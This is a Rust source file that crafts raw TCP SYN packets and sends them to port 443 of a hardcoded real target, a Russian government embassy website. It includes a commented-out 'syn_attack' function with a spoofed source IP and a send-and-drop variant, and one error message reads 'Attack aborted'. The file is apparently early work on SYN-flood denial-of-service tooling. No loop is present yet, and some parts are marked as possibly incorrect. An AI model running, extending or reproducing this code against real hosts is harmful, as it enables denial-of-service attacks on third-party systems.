use core::panic;
use std::net::IpAddr;
use std::net::Ipv4Addr;
use std::net::TcpListener;
use std::io::Error;
use std::net::{SocketAddr, ToSocketAddrs};
use pnet::datalink::NetworkInterface;
use pnet::packet::PacketSize;
use pnet::packet::Packet;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet, Ipv4Flags};
use pnet::packet::tcp::{MutableTcpPacket, TcpPacket};
use pnet::packet::tcp::TcpFlags;
use pnet::datalink;
use ipconfig::get_adapters;
use ipconfig::OperStatus;
use socket2::{Socket, Domain, Type, Protocol};
use rand::Rng;
use std::convert::TryInto;
use url::Url;
use std::io::{self};
use std::time::{Duration, Instant};
use std::mem::MaybeUninit;

fn main() {
    let domain = "https://peru.mid.ru/ru/";
    let syn_test_result: Result<(), Error> = syn_test(domain);
    println!("Execution completed.");
}

fn syn_test(domain: &str) -> Result<(), Error>{

    //Find default adapter ip
    let active_adapter: NetworkInterface;
    if cfg!(target_os = "windows"){
        active_adapter = find_active_adapter_ip_windows()
    } else if cfg!(target_os = "linux"){
        active_adapter = find_active_adapter_ip_linux()
    } else {
        panic!("Failed to assess operating system, what are you running?");
    }
    let source_ip: Ipv4Addr = active_adapter.ips.iter()
    .filter_map(|ip_network| match ip_network.ip() {
        IpAddr::V4(ipv4_addr) => Some(ipv4_addr),
        _ => None,
    })
    .next().unwrap();
    
    //Find target ip
    let host_name: String; 
    match extract_hostname(domain) {
        Some(hostname) => {host_name = hostname},
        None => panic!("Invalid URL or hostname not found"),
    }
    let target_ip: Ipv4Addr = resolve_host(&host_name);
    
    //Generate syn packet
    let mut syn_packet_buffer: [u8; 20] = [0u8; 20];
    let mut ip_packet_buffer: [u8; 40] = [0u8; 40];
    let syn_request_details: (TcpPacket, u16) = generate_syn_packet(source_ip, target_ip, &mut syn_packet_buffer);
    let syn_request_packet: TcpPacket = syn_request_details.0;
    let source_port: u16 = syn_request_details.1;
    let spoofed_ip_packet: Ipv4Packet = generate_ip_packet(source_ip, target_ip, &mut ip_packet_buffer, syn_request_packet);

    //Send the request
    let _success: Result<Vec<MaybeUninit<u8>>, Error> = syn_request_and_listen(spoofed_ip_packet, source_ip, source_port, target_ip);

    Ok(())

}

/*fn syn_attack(domain: &str) -> Result<(), Error>{
    let host_name: String; 
    match extract_hostname(domain) {
        Some(hostname) => {host_name = hostname},
        None => panic!("Invalid URL or hostname not found"),
    }
    let target_ip: Ipv4Addr = resolve_host(&host_name);
    let source_ip: Ipv4Addr = Ipv4Addr::new(192, 168, 0, 1);
    let mut syn_packet_buffer: [u8; 20] = [0u8; 20];
    let mut ip_packet_buffer: [u8; 40] = [0u8; 40];
    let syn_request_packet: TcpPacket = generate_syn_packet(source_ip, target_ip, &mut syn_packet_buffer).0;
    let spoofed_ip_packet: Ipv4Packet = generate_ip_packet(source_ip, target_ip, &mut ip_packet_buffer, syn_request_packet);
    let _success: Result<(), Error> = https_syn_request(spoofed_ip_packet, target_ip);
    println!("SYN request sent to {:?}", domain);
    Ok(())
}*/

fn syn_request_and_listen(packet: Ipv4Packet, source_ip: Ipv4Addr, source_port: u16, target_ip: Ipv4Addr) -> Result<Vec<MaybeUninit<u8>>, Error> {

    //assemble details
    let source_addr_string: String = format!("{}:{}", source_ip, source_port);
    let socket: Socket = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::TCP)).expect("Failed to create socket");
    let target_ip_string: String = target_ip.to_string();
    let target_addr_string: String = format!("{}:{}", target_ip_string, 443);
    let source: SocketAddr = source_addr_string.parse().expect("Unable to parse source address");
    let target: SocketAddr = target_addr_string.parse().expect("Unable to parse target address");
    
    //sanity check
    println!("Source: {:?}", source);
    println!("Target: {:?}", target);
    print_packet_hex(packet.packet());
    
    //send
    socket.send_to(packet.packet(), &target.into()).expect("Failed to send SYN Request through socket");
    println!("SYN request sent to {:?}", target);
    
    //listen
    socket.set_nonblocking(true)?;
    println!("socket set");
    let timeout: Duration = Duration::from_secs(10);
    let start: Instant = Instant::now();
    println!("Starting unsafe..");
    let mut buffer: [MaybeUninit<u8>; 4096] = unsafe { 
        MaybeUninit::uninit().assume_init() 
    };
    println!("Finished second block");

    loop {
        println!("entering loop");
        let buffer_slice: &mut [MaybeUninit<u8>] = &mut buffer[..];
        match socket.recv_from(buffer_slice) {
            Ok((number_of_bytes, src_addr)) => {
                println!("Received {} bytes from {:?}", number_of_bytes, src_addr);
                let buffer_vec: Vec<MaybeUninit<u8>> = buffer_slice[..number_of_bytes].to_vec();
                return Ok(buffer_vec);
            },
            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                println!("Hit Err Block 1");
                if start.elapsed() >= timeout {
                    println!("Listening timed out");
                    return Err(io::Error::new(io::ErrorKind::TimedOut, "Listening timed out"));
                }
            },
            Err(e) => {
                println!("Hit Err Block 2");
                return Err(e);
            }
        }
        // Optional: sleep a bit to prevent the loop from consuming too much CPU
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    

}

fn syn_request_and_drop(packet: Ipv4Packet, source_ip: Ipv4Addr, source_port: u16, target_ip: Ipv4Addr) -> Result<(), Error>{
    let source_addr_string: String = format!("{}:{}", source_ip, source_port);
    let socket: Socket = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::TCP)).expect("Failed to create socket");
    let target_ip_string: String = target_ip.to_string();
    let target_addr_string: String = format!("{}:{}", target_ip_string, 443);
    let source: SocketAddr = source_addr_string.parse().expect("Unable to parse source address");
    let target: SocketAddr = target_addr_string.parse().expect("Unable to parse target address");
    println!("Source: {:?}", source);
    println!("Target: {:?}", target);
    print_packet_hex(packet.packet());
    socket.send_to(packet.packet(), &target.into()).expect("Failed to send SYN Request through socket");
    println!("SYN request sent to {:?}", target);
    Ok(())
}

fn resolve_host(domain: &str) -> Ipv4Addr {

    let mut endpoint: String = domain.to_string();
    
    endpoint.push_str(":443");

    let mut addrs_iter: std::vec::IntoIter<SocketAddr> = endpoint.to_socket_addrs().expect("Failed to create socket address");

    let target_ip: Ipv4Addr;

    match addrs_iter.next() {
        Some(SocketAddr::V4(socket)) => {
            target_ip = socket.ip().clone();
        },
        Some(SocketAddr::V6(ipv6)) => {
            panic!("Domain lookup for {:?} returned ipv6 address {:?}. Panicking..", domain, ipv6);
        },
        _ => {
            panic!("Domain lookup for {:?} returned neither an ipv6 nor a ipv4 address? Panicking..", domain);
        }
    };

    return target_ip;

}

fn generate_ip_packet<'a>(source_ip: Ipv4Addr, target_ip: Ipv4Addr, buffer: &'a mut [u8], payload: TcpPacket) -> Ipv4Packet<'a> {
    {
        let mut packet = MutableIpv4Packet::new(buffer).unwrap();
        let payload_size: u16 = payload.packet_size().try_into().unwrap();
        packet.set_version(4);
        packet.set_header_length(5); // IPv4 header length is 5 (20 bytes)
        packet.set_total_length(20 + payload_size); // 20 bytes of IPv4 header + size of payload
        packet.set_ttl(64); // Time-to-live
        packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        packet.set_source(source_ip);
        packet.set_destination(target_ip);
        packet.set_flags(Ipv4Flags::DontFragment);
        packet.set_payload(payload.packet()); //Potentially incorrect
        packet.set_checksum(pnet::packet::ipv4::checksum(&packet.to_immutable()));
    }

    return Ipv4Packet::new(buffer).unwrap();
}

fn generate_syn_packet(source_ip: Ipv4Addr, target_ip: Ipv4Addr, buffer: &mut [u8]) -> (TcpPacket, u16) {

    let source_port: u16 = match find_open_client_port(){
        Some(port) => port,
        None => panic!("Ran out of ports to comm from!"), 
    };
    
    const TARGET_PORT: u16 = 443;

    {
        let mut tcp_packet = MutableTcpPacket::new(buffer).unwrap();
        let initial_sequence_number: u32 = rand::thread_rng().gen_range(0..4294967295);
        tcp_packet.set_source(source_port);
        tcp_packet.set_destination(TARGET_PORT);
        tcp_packet.set_sequence(initial_sequence_number);
        tcp_packet.set_acknowledgement(0); //No acknowledgement expected for SYN1.
        tcp_packet.set_data_offset(5); // Length of packet in 32 bit 'words'. Always be 5 unless options field is populated.
        tcp_packet.set_flags(TcpFlags::SYN); // Request to init connection.
        tcp_packet.set_window(1024); // Tells server what buffer client has reserved for receiving return data
        let checksum: u16 = pnet::packet::tcp::ipv4_checksum(&tcp_packet.to_immutable(), &source_ip, &target_ip);
        tcp_packet.set_checksum(checksum);
    }

    return (TcpPacket::new(buffer).unwrap(), source_port);

}

fn find_open_client_port() -> Option<u16> {
    const EPHEMERAL_PORTS_START: u16 = 1025;
    const EPHEMERAL_PORTS_END: u16 = 65535;
    let total_ports = EPHEMERAL_PORTS_END - EPHEMERAL_PORTS_START + 1;

    // Generate a random starting point within the range
    let mut rng = rand::thread_rng();
    let start_offset = rng.gen_range(0..total_ports);

    // Iterate over the range, wrapping around if necessary
    for i in 0..total_ports {
        let port = EPHEMERAL_PORTS_START + (start_offset + i) % total_ports;
        let socket: SocketAddr = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)), port);    
        if TcpListener::bind(socket).is_ok() {
            return Some(port);
        }
    }

    None
}

fn find_active_adapter_ip_linux() -> NetworkInterface {

    let interfaces: Vec<datalink::NetworkInterface> = datalink::interfaces();

    for interface in &interfaces {
        println!("Name: {}", interface.name);
        println!("Index: {}", interface.index);
        println!("MAC: {:?}", interface.mac);
        println!("IPs: {:?}", interface.ips);
        println!("Flags: {:?}", interface.flags);
        println!("Running: {:?}", interface.is_up());
        println!("Loopback: {:?}", interface.is_loopback()); 
        println!("-----------------------------------");
    }

    let valid_interfaces: Vec<NetworkInterface> = interfaces.into_iter()
    .filter(|interface| interface.is_up() && !interface.is_loopback())
    .collect();

    return valid_interfaces.get(0).expect("Failed to find valid network adapters (Linux mode)").clone();

}

fn find_active_adapter_ip_windows() -> NetworkInterface {

    let mut win_adapters: Vec<(String, String, OperStatus)> = Vec::new();

    //println!("-----------------------------------");
    match get_adapters() {
        Ok(adapters) => {
            for adapter in adapters {
                    /*println!("Name: {}", adapter.friendly_name());
                    println!("Description: {}", adapter.description());
                    println!("Operational Status: {:?}", adapter.oper_status());
                    println!("IP Addresses: {:?}", adapter.ip_addresses());
                    println!("-----------------------------------");*/
                    let adapter_friendly: String = adapter.friendly_name().to_string();
                    let adapter_full: String = adapter.adapter_name().to_string();
                    let adapter_oper_status: OperStatus = adapter.oper_status();
                    win_adapters.push((adapter_friendly, adapter_full, adapter_oper_status));
            }
        }
        Err(e) => println!("Failed to get network adapters (Windows mode): {}", e),
    }

    let valid_adapters: Vec<(String, String, OperStatus)> = win_adapters.into_iter()
    .filter(|interface: &(String, String, OperStatus)| (interface.0 == "Ethernet" || interface.0 == "WiFi") && interface.2 == OperStatus::IfOperStatusUp)
    .collect();

    let ethernet_adapter = valid_adapters.iter().find(|adapter: &&(String, String, OperStatus)| adapter.0 == "Ethernet");
    let wifi_adapter = valid_adapters.iter().find(|adapter: &&(String, String, OperStatus)| adapter.0 == "WiFi");
    let result = ethernet_adapter.or(wifi_adapter);

    let interfaces: Vec<datalink::NetworkInterface> = datalink::interfaces();

    let valid_interfaces: Vec<NetworkInterface> = interfaces.into_iter()
    .filter(|interface: &NetworkInterface| interface.name.contains(&result.unwrap().1))
    .collect();

    return valid_interfaces.get(0).expect("Attack aborted: No valid network adapter found (Windows mode)").clone();
}

fn extract_hostname(url: &str) -> Option<String> {

    Url::parse(url).ok()
        .and_then(|parsed_url| parsed_url.host_str().map(String::from))
}

fn print_packet_hex(packet: &[u8]) {
    print!("Packet: ");
    for byte in packet {
        print!("{:02x} ", byte);
    }
    println!();
}